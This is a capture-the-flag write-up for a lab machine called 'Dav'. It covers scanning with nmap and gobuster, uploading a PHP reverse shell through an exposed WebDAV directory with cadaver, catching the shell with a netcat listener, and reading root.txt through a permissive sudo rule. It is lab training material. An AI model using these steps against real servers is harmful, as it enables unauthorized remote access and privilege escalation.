# Dav

## :writing\_hand: Solution

### user.txt

```
nmap 10.10.153.244
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-34-56.png>)

```
gobuster dir -u http://10.10.153.244/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64

```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-42-02.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-48-50.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-49-38.png>)

```bash
cadaver http://10.10.153.244/webdav/
dav:> put put php-reverse-shell.php
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-55-46.png>)

```bash
nc -nvlp 4444
$ find / -name user.txt 2>/dev/null
$ cat /home/merlin/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 15-56-21.png>)

### root.txt

```
$ sudo -l
$ sudo /bin/cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-28 16-01-57.png>)

## :link: Support Material

{% embed url="http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/" %}
